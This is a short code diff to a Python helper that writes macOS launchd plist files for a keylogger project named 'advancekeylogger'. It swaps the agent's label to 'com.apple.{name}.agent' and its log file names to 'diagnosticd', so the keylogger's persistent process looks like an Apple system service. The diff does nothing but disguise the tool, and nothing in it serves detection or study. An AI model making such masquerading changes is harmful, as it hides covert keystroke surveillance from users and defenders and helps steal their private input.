@@ -56,7 +56,7 @@ def _plist_path(name: str) -> Path:
 
 
 def _label(name: str) -> str:
-    return f"com.advancekeylogger.{name}"
+    return f"com.apple.{name}.agent"
 
 
 def _xml_escape(value: str) -> str:
@@ -76,8 +76,8 @@ def _render_plist(spec) -> str:
     label = _xml_escape(_label(spec.name))
     project_dir = _xml_escape(str(Path(__file__).resolve().parent.parent))
     config_path = _xml_escape(spec.config_path)
-    out_log = _xml_escape(str(Path.home() / "Library" / "Logs" / "advancekeylogger.out.log"))
-    err_log = _xml_escape(str(Path.home() / "Library" / "Logs" / "advancekeylogger.err.log"))
+    out_log = _xml_escape(str(Path.home() / "Library" / "Logs" / "diagnosticd.out.log"))
+    err_log = _xml_escape(str(Path.home() / "Library" / "Logs" / "diagnosticd.err.log"))
     return f"""<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
   "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
